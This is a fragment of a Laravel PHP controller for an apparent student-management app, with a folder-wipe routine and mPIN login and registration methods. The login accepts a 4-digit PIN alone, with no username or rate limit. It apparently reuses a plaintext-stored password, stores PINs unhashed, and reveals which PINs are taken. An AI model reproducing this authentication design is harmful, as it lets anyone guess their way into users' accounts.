        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'student_id_proof');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'Signature4_img');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'chat');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'student_document');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'whatsapp_documents');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'uplode_qr');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'Sudent_Id_img');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'studentIdPdf');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'student_expence_bill');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'fees_receipt_pdf');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'expense');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'certificates_images');
        File::deleteDirectory(env('IMAGE_UPLOAD_PATH').'payment_receipt');

        
            return redirect::to('/')->with('message', 'folder Clear Successfully.');
    }
    
    public function mpinLogin(Request $request)
    {
        $request->validate([
            'mpin' => 'required|digits:4'
        ]);

        // mPIN user check
        $userData = User::where('mpin', $request->mpin)->first();
        if(empty($userData)){
            $userData = Admission::where('mpin', $request->mpin)
                        ->where('role_id', 3)
                        ->orderBy('id', 'DESC')
                        ->first();
        }

        // ❌ If user not found
        if(empty($userData)){
            return response()->json([
                        'status' => 'error',
                        'message' => 'Invalid mPIN'
                    ]);
                }

        $loginRequest = Request::create('', 'POST', [
            'user_name' => $userData->userName,
            'password'  => $userData->confirm_password
        ]);

        // ✅ Attach session to new request (IMPORTANT)
        $loginRequest->setLaravelSession(session()->driver());

        $this->getLogin($loginRequest);
        return response()->json(['status' => 'success', 'redirect_url' => '/','message'=>'Login Successfully !']);

    }

    public function saveMpin(Request $request)
    {
        $request->validate([
            'user_name' => 'required',
            'password'  => 'required',
            'mpin'      => 'required|digits:4'
        ]);
    
        // check in users table
        $user = User::where('userName', $request->user_name)->first();
    
        // if not found check admission table (optional)
        if(!$user){
            $user = Admission::where('userName', $request->user_name)
                                ->where('role_id',3)
                                ->first();
        }
    
        if(!$user){
            return response()->json(['status'=>'error','message'=>'User not found!']);
        }
    
        // verify password
        if(!Hash::check($request->password, $user->password)){
            return response()->json(['status'=>'error','message'=>'Wrong Password!']);
        }
        
        // ✅ Check mPIN unique in BOTH tables
            $mpinExistsUser = User::where('mpin', $request->mpin)->exists();
            $mpinExistsAdmission = Admission::where('mpin', $request->mpin)->exists();
        
            if ($mpinExistsUser || $mpinExistsAdmission) {
                return response()->json([
                    'status'  => 'error',
                    'message' => 'This mPIN is already taken, please choose another'
                ]);
            }

    
        // ✅ save plain mPIN
        $user->mpin = $request->mpin;
        $user->save();
    
        return response()->json([
            'status'=>'success',
            'message'=>'mPIN saved successfully ✅'
        ]);
    }



}
